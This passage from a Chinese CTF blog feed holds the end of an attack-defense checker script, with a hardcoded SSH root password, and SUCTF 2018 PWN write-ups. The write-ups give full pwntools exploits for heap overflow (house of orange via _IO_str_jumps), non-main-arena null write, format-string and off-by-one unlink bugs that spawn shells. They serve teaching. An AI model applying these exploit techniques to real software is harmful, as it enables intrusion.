loss_num: self.loss = loss_num return -1 else: tmp = self.rhost.recv() #print '[+]',tmp,'[-]' if 'Would You Like to Hit or Stay?' in tmp: self.rhost.sendline("H") elif 'Enter Y for Yes or N for No' in tmp: win_num = int(tmp.split(' Wins and ')[0][-1:]) loss_num = int(tmp.split(' Wins and ')[1][:1]) if self.win &lt; win_num: self.win = win_num return 1 if self.loss &lt; loss_num: self.loss = loss_num return -1 def check_game(self): data = self.rhost.recvuntil('=====================\n&gt;') if not data: print_log(colored('[Error] outoftime : ' + self.oip + '\n', 'red'),ip=self.oip) raise TimeoutError self.win = 0 self.loss = 0 self.money = 5 self.pre_money = 5 self.rhost.sendline(str(0xbabe)) self.rhost.recvuntil("(Y/N)") self.rhost.sendline("y") self.rhost.recvuntil("Choice:") self.rhost.sendline("1") for i in range(3): self.pre_money += self.round() self.rhost.sendline('y') def check_heap(self): data = self.rhost.recvuntil('=====================\n&gt;') if not data: print_log(colored('[Error] outoftime : ' + self.oip + '\n', 'red'),ip=self.oip) raise TimeoutError self.rhost.sendline('2') self.rhost.recvuntil("[") addr_1 = int(self.rhost.recvuntil(']')[:-1],16) self.rhost.recvuntil("domain:") self.rhost.sendline("p4nda") self.rhost.recvuntil("length:") self.rhost.sendline(str(0x58)) self.rhost.recvuntil("[") addr_2 = int(self.rhost.recvuntil(']')[:-1],16) if (addr_2-addr_1)!=0x50: print_log(colored('[Error] in heap : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("remark:") self.rhost.sendline("p4nda") self.rhost.recvuntil("input IP:") self.rhost.sendline("1.1.1.1") #test 1 self.rhost.recvuntil("&gt;") self.rhost.sendline('2') self.rhost.recvuntil("[") addr_3 = int(self.rhost.recvuntil(']')[:-1],16) if(addr_3-addr_2)!=0x80: print_log(colored('[Error] in heap : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("domain:") self.rhost.sendline("dubhe") self.rhost.recvuntil("length:") self.rhost.sendline(str(0x110)) self.rhost.recvuntil("[") addr_4 = int(self.rhost.recvuntil(']')[:-1],16) if (addr_4-addr_3)!=0x50: print_log(colored('[Error] in heap : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("remark:") self.rhost.sendline("p4nda") self.rhost.recvuntil("input IP:") self.rhost.sendline("1.1.1.1") #test 2 self.delete("p4nda") self.rhost.recvuntil("&gt;") self.rhost.sendline('2') self.rhost.recvuntil("[") addr_3 = int(self.rhost.recvuntil(']')[:-1],16) if(addr_3!=addr_1): print_log(colored('[Error] in heap : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("domain:") self.rhost.sendline("p4nda") self.rhost.recvuntil("length:") self.rhost.sendline(str(0x58)) self.rhost.recvuntil("[") addr_4 = int(self.rhost.recvuntil(']')[:-1],16) if(addr_2!=addr_4): print_log(colored('[Error] in heap : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("remark:") self.rhost.sendline("p4nda") self.rhost.recvuntil("input IP:") self.rhost.sendline("1.1.1.1") def function_check(self): try: self.check_login() self.rhost.close() self.rhost = remote(self.oip, self.oport) self.check_DNS() #self.rhost.close() #self.rhost = remote(self.oip, self.oport) #self.check_game() self.rhost.close() self.rhost = remote(self.oip, self.oport) self.check_heap() self.rhost.close() except Exception as e: print e try: self.rhost.close() except Exception as e: pass self.state = 1 def getResult(self): return self.statedef check(ip, port): """ function: check workstate with single ip :return: check result format &#123;'ip': "127.0.0.1", 'status', 0&#125; 0 stands for normal and 1 stands for down """ try: checker = Checker(ip, port, 10) checker.function_check() return checker.getResult() except Exception as e: if debug: print e if 'invalid literal for int() with base 10:' in e : return 0 return 1def upload(check_server, payload): #print payload r = requests.post(check_server, data=payload) print r.textdef log(filename, str): f = open(filename + ".log", 'ab') f.write(str) f.close()def print_log(info,ip=""): print info log(log_file, info + "\n") if ip!="": if not os.path.exists('./checkresult/'): os.makedirs('./checkresult/') log('./checkresult/'+ip+'.log','['+time.asctime( time.localtime(time.time()) )+'] '+ info + "\n")def CalcMD5(filepath): with open(filepath,'rb') as f: md5obj = hashlib.md5() md5obj.update(f.read()) hash = md5obj.hexdigest() #print(hash) return hashdef patch_check(file_path,standard,oip): #print "in" f = open(file_path,"rb") f_standard = open(standard,'rb')#main 0x3370 - 0x325a f.seek(0x325a,0) f_standard.seek(0x325a,0) standard_tmp = f_standard.read(0x3370-0x325a) md5obj = hashlib.md5() tmp = f.read(0x3370-0x325a) md5obj.update(tmp) hash_tmp = md5obj.hexdigest() md5obj = hashlib.md5() #tmp = f.read(0x28f0-0x1273) md5obj.update(standard_tmp) hash_standard = md5obj.hexdigest() if (hash_tmp!=hash_standard): f.close() print_log(colored('[Error] in patch main : ' + oip + '\n', 'red'),ip=oip) return 0 # init 0x29D6 0x2AB6 f.seek(0x29D6,0) f_standard.seek(0x29D6,0) standard_tmp = f_standard.read(0x2AB6-0x29D6) md5obj = hashlib.md5() tmp = f.read(0x2AB6-0x29D6) md5obj.update(tmp) hash_tmp = md5obj.hexdigest() md5obj = hashlib.md5() #tmp = f.read(0x28f0-0x1273) md5obj.update(standard_tmp) hash_standard = md5obj.hexdigest() if (hash_tmp!=hash_standard): f.close() print_log(colored('[Error] in patch init : ' + oip + '\n', 'red'),ip=oip) return 0 # menu 0x2AB7 0x2b03 f.seek(0x2AB7,0) f_standard.seek(0x2AB7,0) standard_tmp = f_standard.read(0x2b03-0x2AB7) md5obj = hashlib.md5() tmp = f.read(0x2b03-0x2AB7) md5obj.update(tmp) hash_tmp = md5obj.hexdigest() md5obj = hashlib.md5() #tmp = f.read(0x28f0-0x1273) md5obj.update(standard_tmp) hash_standard = md5obj.hexdigest() if (hash_tmp!=hash_standard): f.close() print_log(colored('[Error] in patch menu : ' + oip + '\n', 'red'),ip=oip) return 0 f.seek(0x4412,0) flag_str =f.read(22) #print flag_str if flag_str !='/home/tsctf/flag/flag\0': f.close() print_log(colored('[Error] in game-&gt;patch flag path : ' + oip + '\n', 'red'),ip=oip) return 0 f.seek(0x1273,0) f_standard.seek(0x1273,0) standard_tmp = f_standard.read(0x28f0-0x1273) md5obj = hashlib.md5() tmp = f.read(0x28f0-0x1273) md5obj.update(tmp) hash_tmp = md5obj.hexdigest() md5obj = hashlib.md5() #tmp = f.read(0x28f0-0x1273) md5obj.update(standard_tmp) hash_standard = md5obj.hexdigest() if (hash_tmp!=hash_standard): f.close() print_log(colored('[Error] in game-&gt;patch game code : ' + oip + '\n', 'red'),ip=oip) return 0 f.close() return 1def check_thread(round): """ function: cheinvalid literal for int() with base 10:ck every targeted ip """ port = 40111#1022 ipbase = '172.16.20.' team_num = 17 check_result = [] # if not debug: # time.sleep(random.randint(10, 20)) print_log( colored('================= Round %d ==================' % round, "green")) for i in range(1, team_num+1): ip = ipbase + str(i) print_log('check ip: ' + ip) check_count = 0 file_check = 1 for i in range(5): """ check 5 times for every ip, if check fail more than three times, then check result is down """ #ip = "127.0.0.1" #port = 2111 single_check = check(ip, port) if single_check == 0: print_log("[check %d] address: %s result: successful" % (i + 1, ip)) elif single_check == 1: check_count += 1 print_log("[check %d] address: %s result: failed" % (i + 1, ip)) # check shell # to determine whether a team uses common guard try: ssh_shell = ssh(host=ip, port = 1022,user='root', password='GA7E12EH2C3CFEBBD1G4',cache=False) ssh_shell.download(file_path,'./file/'+ip+'.bin') ssh_shell.close() #print os.path.getsize('pwn1') #print CalcMD5("DNS_Server_standard") #print CalcMD5('./file/'+ip+'.bin') if (CalcMD5("DNS_Server_standard")!= CalcMD5('./file/'+ip+'.bin')): if abs(os.path.getsize('DNS_Server_standard') - os.path.getsize('./file/'+ip+'.bin')) &gt; 128: print_log(colored('[Warning] find doubtful patch : ' + ip + '\n', 'red'),ip=ip) if(coding_check_level): file_check = patch_check('./file/'+ip+'.bin',"DNS_Server_standard",ip) else: print_log( colored('[info] file size check ok: ' + ip + '\n', 'green')) except Exception as e: print_log(str(e)) print_log( colored('[Error] cannnot connect %s by ssh' % ip, "yellow")) # upload check result into server if(file_check==1): print_log("[patch_check] address: %s result: successful" %(ip)) else: print_log("[patch_check] address: %s result: failed" %(ip)) print_log("") print check_count,file_check if ((check_count &gt;= 2) | (file_check == 0)): check_result.append(&#123;'tid':ip.split('.')[-1],'qid': '3', 'state': 2&#125;) else: check_result.append(&#123;'tid':ip.split('.')[-1],'qid': '3', 'state': 0&#125;) #print check_result try: #print json.dumps(check_result) upload("http://172.16.123.123/commapi/script/setServiceState", &#123;'result': json.dumps(check_result)&#125;) #print json.dumps(check_result) pass except Exception as e: print_log('[HttpError] cannot connect to http server') print_log(str(check_result)) print_log("")def check_test(): port = 2111 ipbase = '172.16.10.' #ip = '10.210.103.168' check_result = [] check_count = 0 for i in range(5): single_check = check(ip, port) if single_check == 0: print_log("[check %d] address: %s result: successful" % (i + 1, ip)) elif single_check == 1: check_count += 1 print_log("[check %d] address: %s result: failed" % (i + 1, ip)) print_log("") if check_count &gt;= 3: check_result.append(&#123;'ip': '172.16.20.3', 'state': 1&#125;) else: check_result.append(&#123;'ip': '172.16.20.3', 'state': 0&#125;) # check shell # to determine whether a team uses common guard # upload check result into server try: upload("http://172.16.123.123/check_the_player.php", &#123;'result': json.dumps(check_result)&#125;) print json.dumps(check_result) pass except Exception as e: print_log('[HttpError] cannot connect to http server') print_log(str(check_result)) print_log("")if __name__ == '__main__': round = 1 if not os.path.exists('./checkresult/'): os.makedirs('./checkresult/') if not os.path.exists('./file/'): os.makedirs('./file/') while True: thread.start_new_thread(check_thread, (round, )) time.sleep(round_time) # five minutes round += 1'''1. patch heap2. login? 1.2.3. serach4. delete single5. ''' Other线下赛的时候在Checker机制中也发现了许多问题，对于通防的思路还是太窄，好在刚开始比赛的时候用size大小的方法+手工的方法查到了NeSE战队的通防，威逼利诱的情况下后来比赛中没有出现其他通防。]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SUCTF 2018部分PWN题复现]]></title>
    <url>%2F2018%2F05%2F29%2Fsuctf2018%2F</url>
    <content type="text"><![CDATA[写论文已经两周了orz，今天终于写完了… SUCTF完全靠大佬们带飞，躺进XCTF联赛决赛圈了.. notenote这题也是被大佬们秒的比较多的题目了，我个人觉得这次PWN出的还是挺好的。 题目分析题目有添加、显示、潘多拉魔盒（？）函数： add： show: pandora box: 可以看出add函数最多可以申请10次（用处不大？），起初初始化程序时申请了两个连续的0x88的块，在pandora box函数中释放，程序不存在修改操作。 漏洞利用漏洞十分明显，在add函数中，对申请堆块的输入使用scanf(“%s”,(&amp;ptr)[i]，显然存在一个堆溢出漏洞，并且对堆块也没有释放操作。看上去让人容易联想起House of orange，其实也是（…） 题目给的库是libc 2.24的，也就是说必须使用_IO_str_jump的方法利用了。 简单的House of orange我曾经发过一篇原理在看雪论坛上，一起食用风味更佳：从BookWriter看house_of_orange原理【新手向】 具体house of orange的手法是用unsorted bin attack将_IO_list_all覆写成unsorted bin 头节点（libc bss段上的main_arena + 88），此时在出错时最终会调用_IO_flush_all函数，具体是程序会从_IO_list_all中取出保存的_IO_FILE_plus指针以虚表的形式调用_IO_flush_all函数。可攻击的点在于_IO_list_all是一个文件指针单链表，当一个指针不满足时会继续执行下一个指针，可以将指针控制到我们可以控制的堆块中（通过修改size），最终伪造_IO_FILE_plus指针内容，劫持控制流。 在libc 2.24中，增加的对_IO_FILE_plus中的虚表进行检查，不允许将虚表指向意外的地方： 1234567891011121314static inline const struct _IO_jump_t *IO_validate_vtable (const struct _IO_jump_t *vtable)&#123; /* Fast path: The vtable pointer is within the __libc_IO_vtables section. */ uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; const char *ptr = (const char *) vtable; uintptr_t offset = ptr - __start___libc_IO_vtables; if (__glibc_unlikely (offset &gt;= section_length)) /* The vtable pointer is not in the expected section. Use the slow path, which will terminate the process if necessary. */ _IO_vtable_check (); return vtable;&#125; 这时，大佬们考虑将虚表指向一个libc已存在的虚表，这样可以绕过检查了，由于虚表里指针调用的函数偏移不同，将虚表劫持后，会执行另一个虚表的其他函数，这个虚表被劫持为_IO_str_jumps，当执行想_IO_flush_all，实际上执行了_IO_str_overflow函数，在这个函数中当可以绕过一些判断时，可以执行一个新的函数， new_buf = (char ) (((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size); 这个函数同样是相对调用调用，fp时我们可以控制的内存，其内存参数可以通过size计算得到。 可以看到需要满足的条件时： pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only) new_size &lt; old_blen 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061int_IO_str_overflow (_IO_FILE *fp, int c)&#123; int flush_only = c == EOF; _IO_size_t pos; if (fp-&gt;_flags &amp; _IO_NO_WRITES) return flush_only ? 0 : EOF; if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)) &#123; fp-&gt;_flags |= _IO_CURRENTLY_PUTTING; fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr; fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end; &#125; pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base; if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)) &#123; if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */ return EOF; else &#123; char *new_buf; char *old_buf = fp-&gt;_IO_buf_base; size_t old_blen = _IO_blen (fp); _IO_size_t new_size = 2 * old_blen + 100; if (new_size &lt; old_blen) return EOF; new_buf = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size); if (new_buf == NULL) &#123; /* __ferror(fp) = 1; */ return EOF; &#125; if (old_buf) &#123; memcpy (new_buf, old_buf, old_blen); (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf); /* Make sure _IO_setb won't try to delete _IO_buf_base. */ fp-&gt;_IO_buf_base = NULL; &#125; memset (new_buf + old_blen, '\0', new_size - old_blen); _IO_setb (fp, new_buf, new_buf + new_size, 1); fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf); fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf); fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf); fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf); fp-&gt;_IO_write_base = new_buf; fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end; &#125; &#125; if (!flush_only) *fp-&gt;_IO_write_ptr++ = (unsigned char) c; if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end) fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr; return c;&#125;libc_hidden_def (_IO_str_overflow)#define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base) 参考simp1e师傅之前关于Hctf-babyprintf题目的利用 ， 可以对参数进行构造： 2 * old_blen + 100 = addr of “/bin/sh” old_blen = (fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base 构造 (fp)-&gt;_IO_buf_end =（ addr of “/bin/sh” - 100） /2 (fp)-&gt;_IO_buf_base = 0 即可 至于如何构造unsorted bin attack可以通过申请堆块，释放原有的堆块，申请小堆块，溢出写来得到，具体exp如下： EXP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *#SUCTF&#123;Me1z1jiu_say_s0rry_LOL&#125;context.log_level='debug'debug=0if debug: p = process('./note') libc=ELF('./libc.so')else : libc = ELF('./libc6_2.24-12ubuntu1_amd64.so')p = remote('pwn.suctf.asuri.org',20003)p.recvuntil('Welcome Homura Note Book! ')def add(size,content): p.recvuntil('Choice&gt;&gt;') p.sendline('1') p.recvuntil('Size:') p.sendline(str(size)) p.recvuntil('Content:') p.sendline(content)def show(index): p.recvuntil('Choice&gt;&gt;') p.sendline('2') p.recvuntil('Index:') p.sendline(str(index))def dele(): p.recvuntil('Choice&gt;&gt;') p.sendline('3') p.recvuntil('(yes:1)') p.sendline('1')add(16,'1'*16)#2#leak system addressdele()show(0)p.recvuntil('Content:')libc_addr = u64(p.recv(6)+'\x00\x00')offset = 0x7f1b15e2ab78-0x7f1b15a66000libc_base = libc_addr - 88 - 0x10 - libc.symbols['__malloc_hook']sys_addr = libc_base+libc.symbols['system']malloc_hook = libc_base+libc.symbols['__malloc_hook']io_list_all = libc_base+libc.symbols['_IO_list_all']binsh_addr = libc_base+next(libc.search('/bin/sh'))log.info('sys_addr:%#x' %sys_addr)#fake chunkfake_chunk = p64(0x8002)+p64(0x61) #headerfake_chunk += p64(0xddaa)+p64(io_list_all-0x10)fake_chunk += p64(0x2)+p64(0xffffffffffffff) + p64(0)*2 +p64((binsh_addr-0x64)/2)fake_chunk = fake_chunk.ljust(0xa0,'\x00')fake_chunk += p64(sys_addr+0x420)fake_chunk = fake_chunk.ljust(0xc0,'\x00')fake_chunk += p64(0)vtable_addr = malloc_hook-13872#+libc.symbols['_IO_str_jumps']payload = 'a'*16 +fake_chunkpayload += p64(0)payload += p64(0)payload += p64(vtable_addr)payload += p64(sys_addr)payload += p64(2)payload += p64(3) payload += p64(0)*3 # vtablepayload += p64(sys_addr)add(16,payload)#3#gdb.attach(p)p.recvuntil('Choice&gt;&gt;')p.sendline('1')p.recvuntil('Size:')p.sendline(str(0x200))p.interactive() noend这道题涉及的主要是非主分配区的分配方式，相关知识、代码分析和调试方法在之前的N1CTF PWN题记录 中提到过。 漏洞分析漏洞存在于main函数中，对于malloc得到的指针，没有检验是否为0，就对size-1的位置写一个0，可以造成一字节的内存任意写 123buf = malloc(size);read(0, buf, size);*((_BYTE *)buf + size - 1) = 0; 但是想要malloc返回为0，需要申请一个巨大的内存块大小，使得正常的main_arena无法处理，在_libc_malloc中有该部分的函数逻辑： 12345678910111213141516171819202122232425262728293031void *__libc_malloc (size_t bytes)&#123; mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim &amp;&amp; ar_ptr != NULL) &#123; LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; if (ar_ptr != NULL) (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim;&#125;libc_hidden_def (__libc_malloc) 可以看到，在主分配区返回为空时，会初始化一个非主分配区，即ar_ptr = arena_get_retry (ar_ptr, bytes); ，而在此后，均会使用该非主分配区，而assert断言是在debug模式下起作用的，所以当两个分配区都无法处理时，就会返回一个空指针，造成任意写。 123456789101112131415161718192021arena_get_retry (mstate ar_ptr, size_t bytes)&#123; LIBC_PROBE (memory_arena_retry, 2, bytes, ar_ptr); if (ar_ptr != &amp;main_arena) &#123; (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); /* Don't touch the main arena if it is corrupt. */ if (arena_is_corrupt (&amp;main_arena)) return NULL; ar_ptr = &amp;main_arena; (void) mutex_lock (&amp;ar_ptr-&gt;mutex); &#125; else &#123; (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); ar_ptr = arena_get2 (bytes, ar_ptr); &#125; return ar_ptr;&#125; 漏洞利用漏洞利用分为地址泄露和地址劫持两部分。 地址泄露在主分配区和非主分配区里，其实质上的内存分配方式是一样的。由于题目限制，申请内存小于等于0x7f时都会释放，而大于时不会释放。 可以首先分配多个不同大小的fastbin大小的块，会释放并挂到fastbin链中去，再申请一个大块（大于0x78，小于等于0x7f），此时，这个块获取的应该为0x90大小，而释放时会与top合并。合并之后，会触发malloc_consolidate，触发后，fastbin中的较小的堆块由于不和top相连，因此会放到unsorted_bin中一次，最后全部合并后与top合并，造成，top中有部分包含main_arena+88或thread_arena+88的地址，可以再次分配回来造成地址泄露。 劫持执行流在非主分配区中，同样利用内存任意写，对threadarena中保存的top末位地址写0，可使top错位，其中size会落到可以控制的堆块地址中，可通过构造size大小使得可以分配到libc的地址中，劫持\_free_hook为system。具体方法是将堆块分配到__free_hook之前，通过top的性质，将被误作为下一块size的__free_hook写为system+1的地址（需要构造提到的top size），虽然是system+1，但对整体没有影响。因为system的前五条指令是： 123456pwndbg&gt; x /5i system 0x7fdf2f15c6a0 &lt;__libc_system&gt;: test rdi,rdi 0x7fdf2f15c6a3 &lt;__libc_system+3&gt;: je 0x7fdf2f15c6b0 &lt;__libc_system+16&gt; 0x7fdf2f15c6a5 &lt;__libc_system+5&gt;: jmp 0x7fdf2f15c130 &lt;do_system&gt; 0x7fdf2f15c6aa &lt;__libc_system+10&gt;: nop WORD PTR [rax+rax*1+0x0] 0x7fdf2f15c6b0 &lt;__libc_system+16&gt;: lea rdi,[rip+0x145591] # 0x7fdf2f2a1c48 system+1的前五条指令是： 123456pwndbg&gt; x /5i system+1 0x7fdf2f15c6a1 &lt;__libc_system+1&gt;: test edi,edi 0x7fdf2f15c6a3 &lt;__libc_system+3&gt;: je 0x7fdf2f15c6b0 &lt;__libc_system+16&gt; 0x7fdf2f15c6a5 &lt;__libc_system+5&gt;: jmp 0x7fdf2f15c130 &lt;do_system&gt; 0x7fdf2f15c6aa &lt;__libc_system+10&gt;: nop WORD PTR [rax+rax*1+0x0] 0x7fdf2f15c6b0 &lt;__libc_system+16&gt;: lea rdi,[rip+0x145591] # 0x7fdf2f2a1c48 可以发现并没有执行上的影响，再次申请一个小堆块（小于0x50），并在其中写上’/bin/sh\0’就可以拿到shell。 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#coding:utf-8from ctypes import *from pwn import *import timedebug=1elf = ELF('./noend')if debug: p= process('./noend') context.log_level = 'debug' libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p,'c') else: exit(0)def build(size,content): p.sendline(str(size)) time.sleep(0.2) p.send(content) k = p.recvline() return kbuild(0x28,'1'*8)build(0x38,'2'*8)build(0x7f,'a'*8)k = build(0x38,'d'*8) #泄露地址libc.address = u64(k[8:8+8]) - 0x10 - 88 -libc.symbols['__malloc_hook']print '[+] system : ',hex(libc.symbols['system'])p.sendline((str( 0x10 + 87 + libc.symbols['__malloc_hook']))) # 切换到非主分配区time.sleep(0.3)build(0x38,'A'*8)p.clean()build(0x28,'1'*8)build(0x48,'2'*8)build(0x7f,'a'*8)k = build(0x38,'d'*8)thread_arena_addr_top = u64(k[8:8+8])#泄露非主分配区地址print '[+] thread_arena_addr : ',hex(thread_arena_addr_top)target = libc.symbols['system']build(0xf0,p64(target + (libc.symbols['__free_hook'] - thread_arena_addr_top +0x70-0x900 ) )*(0xf0/8))#布置fake top sizep.sendline(str(thread_arena_addr_top+1))#对thread_arena中的top值写末尾一字节time.sleep(0.3)p.sendline()p.recvline()p.clean()time.sleep(1)build(libc.symbols['__free_hook']-(thread_arena_addr_top-0x78+0x900)-0x18,p64(libc.symbols['system']))#将__free_hook劫持为system+1build(0x10,'/bin/sh\0')#free后拿到shell p.interactive() tip对于非主分配区程序的调试，我找到一种相对于简单的方法。 首先利用vmmap指令，找到非主分配区的mmap块位置： 红框中标记的是堆和非主分配区的地址，二者应该是一样大的。 当找到非主分配区地址后，根据libc源码，其中第一块申请的应该是_heap_info结构体，因此，可以看到该结构体内容： 而在该结构体内，其中第一个成员ar_ptr指向的就是非主分配区的arena结构体，与main_arena的结构体是一致的。 注意，在一个thread_arena中仅有一个malloc_state结构体，位于第一个申请的内存块中。 lock2EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148#!/usr/bin/env python# coding=utf-8from pwn import *import itertoolsimport stringimport osdef pwn(offset): # context.log_level = 'DEBUG' p = remote('pwn.suctf.asuri.org', 20001) p.recvuntil('password') p.sendline('123456') def leak_format(start, length): out = '' for i in range(start, start + length): out += '-%%%d$p' % i return out # for i in range(20): # p.recvuntil('cmd:') # format_string = leak_format(2 + 4*i, 4) # p.sendline(format_string) # print p.recvline() def run_cmd(p, cmd): p.recvuntil('cmd:') p.sendline(cmd) def leak_stack(p, index): p.recvuntil('cmd:') p.sendline("%%%d$pAAA" % index) p.recvuntil('cmd:') return int(p.recvuntil('AAA', drop=True), 16) def leak_mem(p, addr): buf = '%7$s' + '=--=' + p64(addr) + 'bb' run_cmd(p, buf) p.recvuntil('cmd:') return p.recvuntil('=--=', drop=True) def write_mem(p, addr, value): if value != 0: buf = ('%%%dc%%7$hn' % value).ljust(8, '=') + p64(addr) + 'bb' else: buf = '%%7$hn'.ljust(8, '=') + p64(addr) + 'bb' run_cmd(p, buf) p.recvuntil('cmd:') def get_codebase(p): code_base = leak_stack(p, 16) &amp; (~0xfff) while True: print hex(code_base) data = leak_mem(p, code_base) if 'ELF' in data: print data break else: code_base -= 0x1000 print 'code_base is ' + hex(code_base) return code_base def dumpmem(offset, length): p = remote('pwn.suctf.asuri.org', 20001) p.recvuntil('password') p.sendline('123456') code_base = get_codebase(p) dump = '' addr = code_base + offset count = 0 while len(dump) &lt; length: count += 1 if '\x0a' in p64(addr): print 'bad addr', hex(addr) addr += 1 dump += '\x00' data = leak_mem(p, addr) data += '\x00' dump += data addr += len(data) print hex(addr) if count % 200 == 0: print dump.encode('hex') p.close() return dump def dumpelf(): for i in range(12): dumpfile = 'dump%02d' % i if os.path.exists(dumpfile): print 'dumpfile %s exists' % dumpfile continue size = 0x400 dump = dumpmem(i*size, size)[:size] print 'dump length is ', len(dump) open(dumpfile, 'wb').write(dump) # dumpelf() # for i in range(2, 20): # try: # print i, hex(leak_stack(i)) # except Exception as e: # print e canary = leak_stack(p, 15) print 'canary is ', hex(canary) p.recvuntil('K ') addr = int(p.recvuntil('--', drop=True), 16) def write_byte(byte): for i in range(8): if byte &gt;&gt; i == 0: break bit = (byte &gt;&gt; i) &amp; 1 write_mem(p, addr + i*4, bit) # for i in range(34, 256): # print i # write_byte(i) # print p.recvline_contains('lock') write_byte(35) p.recvuntil('Box:') func_flag = int(p.recvline().strip('\n'), 16) print 'func_addr is ', hex(func_flag) p.recvuntil('name:') p.sendline('aaaaaaaaaa') # p.sendline('a'*offset + p64(canary) + p64(func_addr)) p.recvuntil('want?') p.sendline('b'*0x1A + p64(canary)*2 + p64(func_flag)*10) p.interactive()for i in range(1): pwn(i) heapEXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from pwn import *context.log_level='debug'debug = 0free_got=0x602018ptr=0x6020c0if debug: p = process('./offbyone') libc = ELF('./libc.so')else: p= remote('pwn.suctf.asuri.org',20004) libc = ELF('./libc-2.23.so')def add(size,data): p.recvuntil('4:edit\n') p.sendline('1') p.recvuntil('input len\n') p.sendline(str(size)) p.recvuntil('input your data\n') p.send(data)def dele(index): p.recvuntil('4:edit\n') p.sendline('2') p.recvuntil('input id\n') p.send(str(index))def show(index): p.recvuntil('4:edit\n') p.sendline('3') p.recvuntil('input id\n') p.send(str(index))def edit(index,data): p.recvuntil('4:edit\n') p.sendline('4') p.recvuntil('input id\n') p.sendline(str(index)) p.recvuntil('input your data\n') p.send(data) add(136,'hack by 0gur1'.ljust(136,'a'))#0add(128,'hack by 0gur2'.ljust(128,'b'))#1add(128,'/bin/sh')#2add(128,'/bin/sh')#3add(128,'hack by 0gur1'.ljust(128,'d'))#4add(136,'hack by 0gur1'.ljust(136,'e'))#5add(128,'hack by 0gur1'.ljust(128,'f'))#6add(128,'hack by 0gur1'.ljust(128,'g'))#7fake_chunk = 'a'*8+p64(0x81) +p64(ptr+40-24)+p64(ptr+40-16)payload= fake_chunkpayload= payload.ljust(0x80,'a')payload+=p64(0x80)payload+='\x90'edit(5,payload)dele(6)edit(5,'\x18\x20\x60')#gdb.attach(p)show(2)free_addr = u64(p.recv(6)+'\x00\x00')sys_addr = free_addr-(libc.symbols['free']-libc.symbols['system'])log.info('sys_addr:%#x' %sys_addr)#gdb.attach(p)edit(2,p64(sys_addr))dele(3)p.interactive()]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[全国大学生信息安全竞赛（CISCN）解题赛部分PWN题解]]></title>
    <url>%2F2018%2F05%2F13%2Fciscn-ctf-2018%2F</url>
